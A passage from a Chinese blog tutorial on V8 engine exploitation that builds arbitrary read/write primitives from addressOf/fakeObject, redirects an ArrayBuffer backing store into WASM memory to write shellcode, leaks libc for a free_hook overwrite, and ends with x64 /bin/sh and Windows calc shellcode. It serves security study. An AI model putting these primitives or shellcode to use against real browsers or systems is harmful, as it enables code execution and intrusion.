<h3 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h3><p>可以尝试构造出这样一个结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var fake_array=[double_array_map,int_to_float(0x4141414141414141n)];<br></code></pre></td></tr></table></figure>

<p>其在内存中的布局应为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">32bit elements map  32bit length  64bit double_array_map  64bit 0x4141414141414141 element<br>32bit fake_array map  32bit properties  32bit elements  32bit length JSArray<br></code></pre></td></tr></table></figure>

<p>接下来通过 addressOf 获取 fake_array 的地址，然后就能够计算出 double_array_map 的地址；再通过 fakeObject 将这个地址伪造成一个对象数组，对比下面的内存布局：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">32bit map addr  32bit properties addr  32bit elements addr  32bit length JSArray<br></code></pre></td></tr></table></figure>

<p>此处的 fake_array[0] 成为了 JSArray 的 map 和 properties ，fake_array[1] 被当作了 elements addr 和 length，通过修改 fake_array[1] 就能够使该 elements 指向任意地址，再访问 fakeObject[0] 即可读取该地址处的数据了(此处 double_array_map 需要对应为一个 double 数组的 map)</p>
<p>代码逻辑大致如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var fake_array=[double_array_map,int_to_float(0x4141414141414141n)];4<br><br>function read64_addr(addr)<br>&#123;<br>    var fake_array_addr=addressOf(fake_array);<br>    var fake_object_addr=fake_array_addr-0x10n;<br>    var fake_object=fakeObject(fake_object_addr);<br>    fake_array[1]=int_to_float(addr-8n+1n);<br>    return fake_object[0];<br><br>&#125; <br></code></pre></td></tr></table></figure>

<h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><p>同上一小节一样，只需要将最后的 return 修改为写入即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var fake_array=[double_array_map,int_to_float(0x4141414141414141n)];4<br><br>function write64_addr(addr,data)<br>&#123;<br>    var fake_array_addr=addressOf(fake_array);<br>    var fake_object_addr=fake_array_addr-0x10n;<br>    var fake_object=fakeObject(fake_object_addr);<br>    fake_array[1]=int_to_float(addr-8n+1n);<br>    fake_object[0]=data;<br>&#125; <br></code></pre></td></tr></table></figure>

<h2 id="写入shellcode"><a href="#写入shellcode" class="headerlink" title="写入shellcode"></a>写入shellcode</h2><p>参考了几篇其他师傅们所写的博客后，会发现目前所实现的任意地址写并不能正常工作，大致原因如下：</p>
<ul>
<li>设置的 elements 地址为 addr-8n+1n，我们想要写 shellcode 的地址一般都是内存段在开头，那么更前面的内存空间则是未开辟的，写入时会因为访问未开辟的内存空间发生异常</li>
<li>另外一个原因是，在尝试写 d8 的 free_hook 或 malloc_hook 时，由于其地址都是以 0x7f 开头，而 Double 类型的浮点数在处理这些高地址时会将低20位置零，导致地址错误(这一点尚未确定，仅作记录)</li>
</ul>
<p>因此直接性的写入不太能够成功，但间接性的方法或许还是存在的，如果向某个对象中写入数据不需要经过 map 和 length，或许就能够顺利完成了。</p>
<p>不过 JavaScript 还真的提供了这样的操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var data_buf = new ArrayBuffer(0x10);<br>var data_view = new DataView(data_buf);<br>data_view.setFloat64(0, 2.0, true);<br>%DebugPrint(data_buf);<br>%DebugPrint(data_view);<br>%SystemBreak();<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; job 0x1032080499e5<br>0x1032080499e5: [JSArrayBuffer]<br> - map: 0x103208203271 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]<br> - prototype: 0x1032081ca361 &lt;Object map = 0x103208203299&gt;<br> - elements: 0x10320800222d &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]<br> - embedder fields: 2<br> - backing_store: 0x56504b1f89d0<br> - byte_length: 16<br> - max_byte_length: 16<br> - detachable<br> - properties: 0x10320800222d &lt;FixedArray[0]&gt;<br> - All own properties (excluding elements): &#123;&#125;<br> - embedder fields = &#123;<br>    0, aligned pointer: (nil)<br>    0, aligned pointer: (nil)<br> &#125;<br>pwndbg&gt; job 0x103208049a25<br>0x103208049a25: [JSDataView]<br> - map: 0x103208202ca9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]<br> - prototype: 0x1032081c8665 &lt;Object map = 0x103208202cd1&gt;<br> - elements: 0x10320800222d &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]<br> - embedder fields: 2<br> - buffer =0x1032080499e5 &lt;ArrayBuffer map = 0x103208203271&gt;<br> - byte_offset: 0<br> - byte_length: 16<br> - properties: 0x10320800222d &lt;FixedArray[0]&gt;<br> - All own properties (excluding elements): &#123;&#125;<br> - embedder fields = &#123;<br>    0, aligned pointer: (nil)<br>    0, aligned pointer: (nil)<br> &#125;<br>pwndbg&gt; tel 0x56504b1f89d0<br>00:0000│  0x56504b1f89d0 ◂— 0x4000000000000000<br>01:0008│  0x56504b1f89d8 ◂— 0x0<br><br>pwndbg&gt; x/20wx 0x1032080499e5-1<br>0x1032080499e4:    0x08203271  0x0800222d  0x0800222d  0x00000010<br>0x1032080499f4:    0x00000000  0x00000010  0x00000000  0x4b1f89d0<br></code></pre></td></tr></table></figure>

<p>可以注意到，JSDataView 的 buffer 指向了 JSArrayBuffer，而 JSArrayBuffer 的 backing_store 则指向了实际的数据储存地址，那么如果我们能够写 backing_store 为 shellcode 内存段，就可以通过 JSDataView 的 setFloat64 方法直接写入了</p>
<p>而该成员在 data_buf+0x1C 处</p>
<blockquote>
<p>每个成员的地址偏移都会因为版本而迁移，这一点还请读者以自己手上的版本为准</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">function shellcode_write(addr,shellcode)<br>&#123;<br>    var data_buf = new ArrayBuffer(shellcode.lenght*8);<br>    var data_view = new DataView(data_buf);<br>    var buf_backing_store_addr=addressOf(data_buf)+0x18n;<br>    write64_addr(buf_backing_store_addr,addr);<br>    for (let i=0;i&lt;shellcode.length;++i)<br>        data_view.setFloat64(i*8,int_to_float(shellcode[i]),true);<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>该函数需要根据实际情况自行修改，示例代码仅做了一些逻辑抽象<br>并且由于数据压缩的原因，获取 buf_backing_store_addr 的操作有可能不只是一次 addressOf 即可完成的，需要将低位和高位分别读出然后合并为 64 位地址后再写入，这里只做逻辑抽象，具体实践在以后的章节中另外补充</p>
</blockquote>
<p>然后是获取写入内存段的地址了，回到开始的这个脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);<br><br>var wasmModule = new WebAssembly.Module(wasmCode);<br>var wasmInstance = new WebAssembly.Instance(wasmModule, &#123;&#125;);<br>var f = wasmInstance.exports.main;<br>%DebugPrint(f);<br>%DebugPrint(wasmInstance);<br>%SystemBreak();<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; job 0x3e63081d35bd<br>0x3e63081d35bd: [WasmInstanceObject] in OldSpace<br> - map: 0x3e6308207399 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]<br> - prototype: 0x3e6308048079 &lt;Object map = 0x3e6308207af1&gt;<br> - elements: 0x3e630800222d &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]<br> - module_object: 0x3e6308049cb1 &lt;Module map = 0x3e6308207231&gt;<br> - exports_object: 0x3e6308049e65 &lt;Object map = 0x3e6308207bb9&gt;<br> - native_context: 0x3e63081c3649 &lt;NativeContext[252]&gt;<br> - memory_object: 0x3e63081d35a5 &lt;Memory map = 0x3e6308207641&gt;<br> - table 0: 0x3e6308049e35 &lt;Table map = 0x3e63082074b1&gt;<br> - imported_function_refs: 0x3e630800222d &lt;FixedArray[0]&gt;<br> - indirect_function_table_refs: 0x3e630800222d &lt;FixedArray[0]&gt;<br> - managed_native_allocations: 0x3e6308049ded &lt;Foreign&gt;<br> - memory_start: 0x7f6b18000000<br> - memory_size: 65536<br> - imported_function_targets: 0x55b235cab0e0<br> - globals_start: (nil)<br> - imported_mutable_globals: 0x55b235cab210<br> - indirect_function_table_size: 0<br> - indirect_function_table_sig_ids: (nil)<br> - indirect_function_table_targets: (nil)<br> - properties: 0x3e630800222d &lt;FixedArray[0]&gt;<br> - All own properties (excluding elements): &#123;&#125;<br><br>pwndbg&gt; tel 0x3e63081d35bd-1 30<br>00:0000│  0x3e63081d35bc ◂— 0x800222d08207399<br>01:0008│  0x3e63081d35c4 ◂— 0x800222d0800222d /* &#x27;-&quot;&#x27; */<br>02:0010│  0x3e63081d35cc ◂— 0x800222d /* &#x27;-&quot;&#x27; */<br>03:0018│  0x3e63081d35d4 —▸ 0x7f6b18000000 ◂— 0x0<br>04:0020│  0x3e63081d35dc ◂— 0x10000<br>05:0028│  0x3e63081d35e4 —▸ 0x55b235c861b0 —▸ 0x7ffd839ca5f0 ◂— 0x7ffd839ca5f0<br>06:0030│  0x3e63081d35ec —▸ 0x55b235cab0e0 ◂— 0x0<br>07:0038│  0x3e63081d35f4 ◂— 0x0<br>... ↓     2 skipped<br>0a:0050│  0x3e63081d360c —▸ 0x55b235cab210 —▸ 0x7f6d2e41cbe0 (main_arena+96) —▸ 0x55b235d28080 ◂— 0x0<br>0b:0058│  0x3e63081d3614 —▸ 0x55b235c86190 —▸ 0x3e6300000000 ◂— sub    rsp, 0x80<br>0c:0060│  0x3e63081d361c —▸ 0x1998dd4f3000 ◂— jmp    0x1998dd4f3480 /* 0xcccccc0000047be9 */<br></code></pre></td></tr></table></figure>

<p>可以注意到在 wasmInstance+0x68 处保存了内存段的起始地址，读取该处即可</p>
<h2 id="泄露地址手记"><a href="#泄露地址手记" class="headerlink" title="泄露地址手记"></a>泄露地址手记</h2><p>目前为止都是通过自定义一部分变量完成地址泄露的，但这个地址只是某个匿名内存段罢了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x271c08040000     0x271c0814d000 rw-p   10d000 0      [anon_271c08040]<br></code></pre></td></tr></table></figure>

<p>因为 WASM 是我们自己定义的，所以还能通过某些方法拿到地址，但如果我们现在不想写 shellcode，想像常规的 PWN 那样去写 free_hook 或者 GOT 表时，该如何泄露地址？</p>
<p>一个是随机泄露，从某个变量随机的往上一个个测试偏移地址，但很显然，在开启了 ASLR 的情况下，效率太低还不稳定，因此主要通过另外一个较为稳定的方式泄露地址：</p>
<p>JSArray结构体–&gt; Map结构体–&gt;constructor结构体–&gt;code属性地址–&gt;code内存地址的固定偏移处保存了 v8 的二进制指令地址–&gt;v8 的 GOT 表–&gt; libc基址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; job 0x34d808049979<br>0x34d808049979: [JSArray]<br> - map: 0x34d808203ae1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]<br><br>pwndbg&gt; job 0x34d808203ae1<br>0x34d808203ae1: [Map]<br> - type: JS_ARRAY_TYPE<br> - constructor: 0x34d8081cbe85 &lt;JSFunction Array (sfi = 0x34d80814adc9)&gt;<br><br>pwndbg&gt; job 0x34d8081cbe85<br>0x34d8081cbe85: [Function] in OldSpace<br> - map: 0x34d808203a19 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]<br> - code: 0x34d800185501 &lt;Code BUILTIN ArrayConstructor&gt;<br><br>pwndbg&gt; tel 0x34d800185501-1+0x7EBAB00 30<br>00:0000│  0x34d808040000 ◂— 0x40000<br>01:0008│  0x34d808040008 ◂— 0x12<br>02:0010│  0x34d808040010 —▸ 0x55cca1732560 ◂— 0x0<br>03:0018│  0x34d808040018 —▸ 0x34d808042118 ◂— 0x608002205<br>04:0020│  0x34d808040020 —▸ 0x34d808080000 ◂— 0x40000<br>05:0028│  0x34d808040028 ◂— 0x3dee8<br>06:0030│  0x34d808040030 ◂— 0x0<br>07:0038│  0x34d808040038 ◂— 0x2118<br>08:0040│  0x34d808040040 —▸ 0x55cca17b4258 —▸ 0x55cc9f7a5d20 —▸ 0x55cc9e9ba260 ◂— push   rbp<br><br>pwndbg&gt; vmmap<br>LEGEND: STACK  HEAP  CODE  DATA  RWX  RODATA<br>    0x55cc9e121000     0x55cc9e954000 r--p   833000 0      /path/d8<br>    0x55cc9e954000     0x55cc9f793000 r-xp   e3f000 832000 /path/d8<br>    0x55cc9f793000     0x55cc9f7fb000 r--p    68000 1670000 /path/d8<br>    0x55cc9f7fb000     0x55cc9f80c000 rw-p    11000 16d7000 /path/d8<br></code></pre></td></tr></table></figure>

<p>可以注意到，顺着这个地址链查下去，最终能找到地址 0x55cc9e9ba260 ，该地址对应了 d8 的二进制程序中的代码地址，而整个 d8 在内存中是连续的，因此可以找到其 GOT 表，然后再从中得到 libc 的机制，最后即可覆盖 free_hook 或 free 的 got 表为 system 或 one gadget</p>
<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>最后补充一下可用的 shellcode：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//Linux x64<br>var shellcode = [  <br>  0x2fbb485299583b6an,  <br>  0x5368732f6e69622fn,  <br>  0x050f5e5457525f54n  <br>];  <br><br>//Windows 计算器<br>var shellcode = [  <br>    0xc0e8f0e48348fcn,  <br>    0x5152504151410000n,  <br>    0x528b4865d2314856n,  <br>    0x528b4818528b4860n,  <br>    0xb70f4850728b4820n,  <br>    0xc03148c9314d4a4an,  <br>    0x41202c027c613cacn,  <br>    0xede2c101410dc9c1n,  <br>    0x8b20528b48514152n,  <br>    0x88808bd001483c42n,  <br>    0x6774c08548000000n,  <br>    0x4418488b50d00148n,  <br>    0x56e3d0014920408bn,  <br>    0x4888348b41c9ff48n,  <br>    0xc03148c9314dd601n,  <br>    0xc101410dc9c141acn,  <br>    0x244c034cf175e038n,  <br>    0x4458d875d1394508n,  <br>    0x4166d0014924408bn,  <br>    0x491c408b44480c8bn,  <br>    0x14888048b41d001n,  <br>    0x5a595e58415841d0n,  <br>    0x83485a4159415841n,  <br>    0x4158e0ff524120ecn,  <br>    0xff57e9128b485a59n,  <br>    0x1ba485dffffn,  <br>    0x8d8d480000000000n,  <br>    0x8b31ba4100000101n,  <br>    0xa2b5f0bbd5ff876fn,  <br>    0xff9dbd95a6ba4156n,  <br>    0x7c063c28c48348d5n,  <br>    0x47bb0575e0fb800an,  <br>    0x894159006a6f7213n,  <br>    0x2e636c6163d5ffdan,  <br>    0x657865n,  <br>];<br></code></pre></td></tr></table></figure>

<p>另外，上述代码中的 int_to_float 等函数需要自行定义，实现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">function float_to_int(f)  <br>&#123;  <br>  f64[0] = f;  <br>    return bigUint64[0];  <br>&#125;  <br><br>function int_to_float(i)  <br>&#123;  <br>    bigUint64[0] = i;  <br>    return f64[0];  <br>&#125;  <br></code></pre></td></tr></table></figure>

<hr>
<p>插画作者：Mike Poe-mjcr24.artstation.com</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/09/07/record-202209/">← 下一篇 实习随想与踩坑记录</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/07/06/chose-me-javascript-v8-chapter1/">Chose me  JavaScript-V8 /Chapter1-环境配置 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WASM%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">WASM的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">高版本的变化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%82%A8%E5%AD%98%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">数据储存方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JSArray-a"><span class="toc-number">3.1.</span> <span class="toc-text">JSArray:a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JS-OBJECT-TYPE-b"><span class="toc-number">3.2.</span> <span class="toc-text">JS_OBJECT_TYPE:b</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSArray-c"><span class="toc-number">3.3.</span> <span class="toc-text">JSArray:c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSArray%EF%BC%9Ad"><span class="toc-number">3.4.</span> <span class="toc-text">JSArray：d</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E8%AF%86%E5%88%AB"><span class="toc-number">3.5.</span> <span class="toc-text">类型识别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%8F%98%E9%87%8F%E5%9C%B0%E5%9D%80%E8%AF%BB"><span class="toc-number">4.</span> <span class="toc-text">任意变量地址读</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#addressOf"><span class="toc-number">4.1.</span> <span class="toc-text">addressOf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fakeObject"><span class="toc-number">4.2.</span> <span class="toc-text">fakeObject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB"><span class="toc-number">4.3.</span> <span class="toc-text">任意地址读</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">5.</span> <span class="toc-text">任意地址写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5shellcode"><span class="toc-number">6.</span> <span class="toc-text">写入shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80%E6%89%8B%E8%AE%B0"><span class="toc-number">7.</span> <span class="toc-text">泄露地址手记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%BE%E5%A3%B0"><span class="toc-number">8.</span> <span class="toc-text">尾声</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>